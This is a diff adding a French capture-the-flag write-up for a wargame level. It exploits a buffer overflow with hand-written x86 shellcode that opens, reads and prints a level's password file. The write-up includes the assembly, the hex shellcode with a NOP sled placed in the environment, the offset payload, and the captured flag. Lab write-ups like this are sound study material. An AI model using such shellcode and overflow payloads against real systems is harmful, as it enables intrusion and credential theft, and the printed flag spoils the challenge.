@@ -1,0 +1,61 @@
+Nous remarquons que l'on peut effectuer un buffer overflow. Nous pouvons donc lancer un shellcode.
+Mais il est impossible que ce shellcode contienne un appel au syscall execve. Nous ne pouvons pas donc pas
+utiliser un shellcode tout fait creant un shell.
+Nous pouvons par contre creer un shellcode qui va ouvrir le fichier /home/users/level05/.pass, le lire, et afficher son
+contenu sur la sortie standard.
+Nous creons donc le programme assembleur suivant :
+
+
+.text
+.global _start
+_start:
+
+jmp ender
+starter:
+xor %eax,%eax
+movb $0x5, %al
+pop %ebx
+xor %ecx,%ecx
+xor %edx, %edx
+movw $0x1ff, %dx
+int $0x80
+
+mov $0xffffbfdc, %ecx
+mov %eax, %ebx
+xor %eax, %eax
+movb $0x3, %al
+xor %edx, %edx
+movb $0x29, %dl
+int $0x80
+
+mov %eax, %edx
+xor %eax,%eax
+movb $0x4,%al
+xor %ebx,%ebx
+movb $1, %bl
+int $0x80
+ret
+ender:
+call starter
+.ascii "/home/users/level05/.pass"
+
+Ici, nous avons du ruser pour mettre le nom du fichier que l'on veut ouvrir dans la stack, à l'aide de l'instruction call qui
+va push l'adresse suivant le call pour l'utiliser comme adresse de retour, on pourra donc pop cette adresse dans ebx et s'en servir
+comme parametre de open.
+
+Nous avons aussi du ruser pour enlever les caracteres nuls de notre shellcode.
+En effet "xor eax, eax" mettra toujours eax a 0, puis un movb dans al nous permettre de mettra la valeur qu'on veut dans eax,
+si elle est compris entre 00 et ff.
+
+On compile le programme assembleur :
+gcc -c  -o obj.o -m32 shellcode.s ; ld -m elf_i386 obj.o
+On recupere les opcodes hexa du programme : objdump -D a.out
+On met le shellcode dans l'environnement :
+export BINSH=`python -c "print '\x90' * 10000 + '\xeb\x2d\x31\xc0\xb0\x05\x5b\x31\xc9\x31\xd2\x66\xba\xff\x01\xcd\x80\xb9\xdc\xbf\xff\xff\x89\xc3\x31\xc0\xb0\x03\x31\xd2\xb2\x29\xcd\x80\x89\xc2\x31\xc0\xb0\x04\x31\xdb\xb3\x01\xcd\x80\xc3\xe8\xce\xff\xff\xff\x2f\x68\x6f\x6d\x65\x2f\x75\x73\x65\x72\x73\x2f\x6c\x65\x76\x65\x6c\x30\x35\x2f\x2e\x70\x61\x73\x73'"`
+
+En calculant les offsets, on voit que eip est stocké à buffer + 156. On ecrit donc 156 a suivi de l'adresse du shellcode
+dans l'environnement :
+
+python -c "print 'a' * 156 + '\xdc''\xbf''\xff''\xff'"  | ./level0
+
+Flag : 3v8QLcN5SAhPaZZfEasfmXdwyR59ktDEMAwHF3aN
